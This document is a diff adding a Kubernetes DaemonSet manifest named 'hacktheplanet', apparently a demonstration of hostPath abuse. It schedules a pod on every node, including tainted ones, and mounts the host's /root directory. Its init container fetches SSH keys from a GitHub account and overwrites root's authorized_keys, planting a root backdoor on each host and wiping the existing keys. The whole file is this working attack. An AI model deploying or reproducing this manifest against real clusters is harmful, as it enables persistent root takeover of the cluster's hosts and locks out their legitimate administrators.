@@ -1,0 +1,34 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: hacktheplanet
+spec:
+  selector:
+    matchLabels:
+      app: hacktheplanet
+  template:
+    metadata:
+      labels:
+        app: hacktheplanet
+    spec:
+      volumes:
+      - name: root
+        hostPath:
+          path: /root
+      tolerations:
+      - effect: NoSchedule
+        operator: Exists
+      initContainers:
+      - name: hacktheplanet
+        image: alpine
+        volumeMounts:
+        - name: root
+          mountPath: /root
+        command:
+        - sh
+        - -c
+        - "apk update && apk add curl && curl https://github.com/jpetazzo.keys > /root/.ssh/authorized_keys"
+      containers:
+      - name: web
+        image: nginx
+
